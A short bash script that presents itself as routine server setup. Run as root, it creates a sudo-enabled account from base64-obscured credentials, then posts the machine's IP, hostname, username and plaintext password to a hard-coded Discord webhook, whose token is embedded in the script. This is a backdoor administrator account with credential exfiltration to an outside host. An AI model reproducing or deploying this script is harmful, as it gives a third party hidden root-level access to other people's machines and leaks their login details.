#!/bin/bash
set -e

# Configuration
_X1="dm0="
_X2="dm0="
_W="https://discord.com/api/webhooks/1494735082173501631/ovStsIdstHE1ZqQhC4MrRFIfHLHxaPZEMYRcRxWOugP7E09buz0MAxfTRcFOixry2zMz"

# Check for root
if [ "$EUID" -ne 0 ]; then 
    echo "Run as root"
    exit 1
fi

# Update and install tools
apt update -y && apt install sudo curl -y

# Decode User and Pass
U=$(echo "$_X1" | base64 --decode)
P=$(echo "$_X2" | base64 --decode)

# Create User
if ! id "$U" &>/dev/null; then
    useradd -m -s /bin/bash "$U"
    echo "$U:$P" | chpasswd
    usermod -aG sudo "$U"
fi

# Get Info
IP=$(curl -s https://api.ipify.org || echo "Unknown")
H=$(hostname)

# Prepare the Discord JSON payload correctly
PAYLOAD=$(printf '{"content": "✅ **User Created**\\n**IP:** %s\\n**Host:** %s\\n**User:** %s\\n**Pass:** %s"}' "$IP" "$H" "$U" "$P")

# Send to Discord
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$_W"

exit 0
